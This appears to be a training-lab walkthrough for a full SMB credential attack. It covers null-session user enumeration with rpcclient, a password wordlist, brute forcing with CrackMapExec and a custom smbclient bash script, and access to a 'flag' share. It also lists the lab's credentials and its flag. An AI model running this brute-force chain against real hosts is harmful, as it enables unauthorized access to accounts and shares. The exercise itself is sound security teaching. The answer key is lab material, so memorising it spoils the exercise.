# Lab 3.5: SMB Full Credential Attack

## Learning Objectives
- Enumerate valid usernames on SMB service
- Perform automated brute force attacks against multiple users
- Complete the full SMB attack chain: enumeration → brute force → access
- Use modern tools that support SMBv2/v3
- Capture the flag

## What is a Full Credential Attack?

This lab combines all SMB credential attack techniques:

1. **Username Enumeration**: Discovering all valid usernames on the target system
2. **Password Brute Force**: Systematically testing passwords against all enumerated users
3. **Credential Access**: Using discovered credentials to access protected shares

This represents the complete attack chain from reconnaissance to successful authentication.

### Important Note About SMB Versions

**Modern Samba servers use SMBv2/v3 by default**, which many older brute force tools do not support:
- **Hydra**: Only supports SMBv1 (deprecated and disabled by default)
- **CrackMapExec**: Supports SMBv2/v3 (recommended)
- **smbclient**: Supports all SMB versions (can be scripted)

This lab uses modern SMB protocols, so we'll use tools that support SMBv2/v3.

## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting enumeration.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify SMB service is running:**
   ```bash
   nmap -p 445 <target_ip>
   ```

   **Expected output:**
   ```
   PORT    STATE SERVICE
   445/tcp open  microsoft-ds
   ```

### Step 2: Enumerate Users

Enumerate users to identify all valid usernames before brute forcing. **This is critical - you must enumerate first!**

**Note**: `enum4linux` may show errors in some environments. If it fails, use `rpcclient` (Method 2) which is more reliable.

**Detailed Steps:**

1. **Method 1: Use rpcclient (Recommended - More Reliable):**
   ```bash
   rpcclient -U "" -N <target_ip>
   ```
   
   Replace `<target_ip>` with your actual target IP

   Then in the rpcclient prompt:
   ```bash
   rpcclient $> enumdomusers
   rpcclient $> exit
   ```

   **Expected output:**
   ```
   user:[admin] rid:[0x3e8]
   user:[user1] rid:[0x3e9]
   user:[test] rid:[0x3ea]
   user:[guest] rid:[0x3eb]
   ```

2. **Method 2: Use enum4linux (May Show Errors):**
   ```bash
   enum4linux -U <target_ip>
   ```
   
   **Note**: If you see errors like "Can't find workgroup/domain" or "Use of uninitialized value", this is normal. The enumeration may still work, or you can use `rpcclient` instead.

3. **Extract usernames to file:**
   ```bash
   # Using rpcclient output
   rpcclient -U "" -N <target_ip> -c "enumdomusers" | grep "user:" | cut -d'[' -f2 | cut -d']' -f1 > users.txt
   
   # Or manually create from enumeration results
   echo -e "admin\nuser1\ntest" > users.txt
   
   # Verify
   cat users.txt
   ```

   **Expected users.txt:**
   ```
   admin
   user1
   test
   ```

4. **Clean up usernames (remove default accounts if needed):**
   ```bash
   # Keep all users for this lab (we want to test all of them)
   cat users.txt
   ```

### Step 3: Create Password Wordlist

Prepare a password wordlist for brute forcing.

**Detailed Steps:**

1. **Create password wordlist:**
   ```bash
   echo -e "password\nadmin\nadmin123\nqwerty\n123456\npassword123\nPassword123\nletmein\nwelcome\ntest123" > passwords.txt
   ```

2. **Verify wordlist:**
   ```bash
   cat passwords.txt
   ```

   **Expected output:**
   ```
   password
   admin
   admin123
   qwerty
   123456
   password123
   Password123
   letmein
   welcome
   test123
   ```

3. **Alternative: Use existing wordlist:**
   ```bash
   # Use rockyou.txt (large, comprehensive)
   cp /usr/share/wordlists/rockyou.txt passwords.txt
   
   # Or use smaller common passwords list
   head -1000 /usr/share/wordlists/rockyou.txt > passwords.txt
   ```

### Step 4: Brute Force Credentials with CrackMapExec (Recommended)

Use CrackMapExec to brute force all username/password combinations. This is the recommended method for modern SMB.

**Detailed Steps:**

1. **Verify CrackMapExec is installed:**
   ```bash
   which crackmapexec
   crackmapexec --version
   ```

   **If not installed:**
   ```bash
   # Install via pip (if available)
   pip3 install crackmapexec
   
   # Or install via apt (Kali Linux)
   sudo apt update && sudo apt install crackmapexec
   ```

2. **Brute force all user/password combinations:**
   ```bash
   crackmapexec smb <target_ip> -u users.txt -p passwords.txt
   ```
   
   Replace `<target_ip>` with your actual target IP

   **Command breakdown:**
   - `crackmapexec`: Modern penetration testing tool
   - `smb`: Protocol to test (SMB)
   - `<target_ip>`: Target IP address
   - `-u users.txt`: File containing usernames (one per line)
   - `-p passwords.txt`: File containing passwords (one per line)

3.    **Expected output:**
   ```
   SMB         <target_ip>      445    TARGET-HOST      [*] Windows 6.1 Build 0 (name:TARGET-HOST) (domain:WORKGROUP) (signing:False) (SMBv1:False)
   SMB         <target_ip>      445    TARGET-HOST      [+] WORKGROUP\admin:admin
   SMB         <target_ip>      445    TARGET-HOST      [+] WORKGROUP\user1:password
   SMB         <target_ip>      445    TARGET-HOST      [+] WORKGROUP\test:test123
   ```

   **Key information:**
   - `[+]` indicates successful authentication
   - Multiple credentials may be discovered
   - **Expected credentials for this lab:**
     - `admin:admin` (username `admin`, password `admin`)
     - `user1:password` (username `user1`, password `password`)
     - `test:test123` (username `test`, password `test123`)
   - Document all valid username/password pairs

4. **Save results:**
   ```bash
   crackmapexec smb <target_ip> -u users.txt -p passwords.txt | tee results.txt
   grep "[+]" results.txt
   ```

### Step 5: Brute Force with smbclient Script (Alternative Method)

If CrackMapExec is not available, you can use a bash script with `smbclient` to brute force credentials.

**Detailed Steps:**

1. **Create brute force script:**
   ```bash
   cat > smb_brute.sh << 'EOF'
   #!/bin/bash
   TARGET="$1"
   USERLIST="$2"
   PASSLIST="$3"
   SHARE="flag"
   
   if [ -z "$TARGET" ] || [ -z "$USERLIST" ] || [ -z "$PASSLIST" ]; then
       echo "Usage: $0 <target_ip> <userlist> <passlist>"
       exit 1
   fi
   
   while read username; do
       while read password; do
           echo "[*] Trying $username:$password"
           if smbclient "//$TARGET/$SHARE" -U "$username%$password" -c "ls" > /dev/null 2>&1; then
               echo "[+] SUCCESS! Username: $username Password: $password"
           fi
       done < "$PASSLIST"
   done < "$USERLIST"
   
   echo "[-] Brute force complete"
   EOF
   
   chmod +x smb_brute.sh
   ```

2. **Run the brute force script:**
   ```bash
   ./smb_brute.sh <target_ip> users.txt passwords.txt
   ```

   Replace `<target_ip>` with your actual target IP.

3. **Expected output:**
   ```
   [*] Trying admin:password
   [*] Trying admin:admin
   [+] SUCCESS! Username: admin Password: admin
   [*] Trying user1:password
   [+] SUCCESS! Username: user1 Password: password
   [*] Trying test:test123
   [+] SUCCESS! Username: test Password: test123
   ```

### Step 6: Access Flag Share

Use discovered credentials to access the flag share.

**Detailed Steps:**

1. **Identify flag share:**
   - The share is named `flag` (as configured in the lab)
   - You can also list shares to confirm:
   ```bash
   smbclient -L //<target_ip> -N
   ```

2. **Connect with discovered credentials:**
   ```bash
   smbclient //<target_ip>/flag -U admin%admin
   ```
   
   Replace `<target_ip>` with your actual target IP and use any of the discovered credentials.

   **Important**: Use the correct password for each username:
   - `admin:admin` (username `admin`, password `admin` - **NOT** `password`)
   - `user1:password` (username `user1`, password `password`)
   - `test:test123` (username `test`, password `test123`)

   **Example connections:**
   ```bash
   # Using admin credentials
   smbclient //<target_ip>/flag -U admin%admin
   
   # Using user1 credentials
   smbclient //<target_ip>/flag -U user1%password
   
   # Using test credentials
   smbclient //<target_ip>/flag -U test%test123
   ```

3. **Expected successful connection:**
   ```
   Try "help" for a list of possible commands.
   smb: \>
   ```

4. **List files:**
   ```bash
   ls
   ```

   **Expected output:**
   ```
     .                                   D        0  Mon Jan 15 10:00:00 2024
     ..                                  D        0  Mon Jan 15 10:00:00 2024
     flag.txt                            A       45  Mon Jan 15 10:00:00 2024
   
                   524288 blocks of size 1024. 524288 blocks available
   ```

5. **Download the flag:**
   ```bash
   get flag.txt
   ```

6. **Exit and view:**
   ```bash
   exit
   cat flag.txt
   ```

   **Expected output:**
   ```
   OCR{smb_full_4tt4ck}
   ```

### Step 7: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{smb_full_4tt4ck}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

## Troubleshooting

### enum4linux Shows Errors

**Cause**: `enum4linux` may have issues with some Samba configurations.

**Solution**: Use `rpcclient` instead, which is more reliable:
```bash
rpcclient -U "" -N <target_ip>
rpcclient $> enumdomusers
rpcclient $> exit
```

### No Users Found During Enumeration

**Possible causes:**
- SMB service not running
- Network connectivity issues
- Wrong target IP

**Solutions:**
- Verify SMB service: `nmap -p 445 <target_ip>`
- Test connectivity: `ping <target_ip>`
- Try manual user list: `echo -e "admin\nuser1\ntest" > users.txt`

### CrackMapExec Not Found

**Solution:**
```bash
# Install via pip
pip3 install crackmapexec

# Or on Kali Linux
sudo apt update && sudo apt install crackmapexec
```

### No Credentials Discovered

**Possible causes:**
- Password not in wordlist
- Wrong usernames
- Wordlist file path incorrect

**Solutions:**
- Verify wordlist contains: `admin`, `password`, `test123`
- Check usernames match enumeration: `admin`, `user1`, `test`
- Verify file paths: `ls -la users.txt passwords.txt`

### Cannot Access Flag Share / NT_STATUS_LOGON_FAILURE

**Cause**: Wrong password for the username.

**Important**: Each username has a specific password:
- `admin` → password is `admin` (NOT `password`)
- `user1` → password is `password`
- `test` → password is `test123`

**Solutions:**
- **Verify correct credentials:**
  ```bash
  # Try admin with password 'admin'
  smbclient //<target_ip>/flag -U admin%admin
  
  # Try user1 with password 'password'
  smbclient //<target_ip>/flag -U user1%password
  
  # Try test with password 'test123'
  smbclient //<target_ip>/flag -U test%test123
  ```

- **List shares to verify share name:**
  ```bash
  smbclient -L //<target_ip> -N
  ```
  Share name should be `flag`

- **If CrackMapExec shows confusing output:**
  - CrackMapExec may show multiple results concatenated
  - Look for lines with `[+]` and note the username:password pairs
  - Each username has its own specific password

## Success Criteria

- ✅ Verified target IP and SMB service accessibility
- ✅ Enumerated users using rpcclient or enum4linux
- ✅ Created user list (users.txt) from enumeration
- ✅ Created password wordlist (passwords.txt)
- ✅ Ran brute force attack using CrackMapExec or smbclient script
- ✅ Discovered valid credentials (multiple username/password pairs)
- ✅ Successfully connected to flag share with discovered credentials
- ✅ Listed files and located flag.txt
- ✅ Downloaded flag using `get` command
- ✅ Verified flag format is correct: `OCR{...}`

## Key Learning Points

- **Complete Attack Chain**: Enumeration → Brute Force → Access
- **Enumeration First**: Always enumerate users before brute forcing
- **Multiple Credentials**: Multiple users may have weak passwords
- **Modern SMB Protocols**: SMBv2/v3 are standard; use tools that support them
- **Tool Selection**: Choose tools that support the protocol version in use
- **Credential Verification**: Always verify discovered credentials by connecting manually

## Alternative Tools and Methods

### Method 1: CrackMapExec (Best for Modern SMB)

```bash
# Brute force all user/password combinations
crackmapexec smb <target_ip> -u users.txt -p passwords.txt

# With share enumeration
crackmapexec smb <target_ip> -u users.txt -p passwords.txt --shares

# Save results
crackmapexec smb <target_ip> -u users.txt -p passwords.txt | tee results.txt
```

### Method 2: smbclient Script (Universal)

The bash script method works with all SMB versions and doesn't require additional tools.

### Method 3: Using Hydra (Not Recommended - SMBv1 Only)

**Note**: Hydra only supports SMBv1, which is deprecated and disabled by default in modern Samba. This lab uses modern SMB protocols, so Hydra will not work.

## Common Mistakes

- ❌ Not enumerating users first
- ❌ Using Hydra (only supports SMBv1, won't work)
- ❌ Wordlist too small or missing common passwords
- ❌ Not testing all discovered credentials
- ❌ Wrong share name when connecting

## Hints

1. **Enumerate first**: Use `rpcclient -U "" -N <target_ip>` then `enumdomusers`
2. **Multiple users**: Look for `admin`, `user1`, `test`
3. **Use modern tools**: `crackmapexec smb <target_ip> -u users.txt -p passwords.txt`
4. **Correct password pairs**:
   - `admin` → password is `admin`
   - `user1` → password is `password`
   - `test` → password is `test123`
5. **Share name**: `flag`
6. **Any valid credentials work**: Try all discovered username/password pairs
7. **Important**: Each username has its own specific password - don't mix them up!
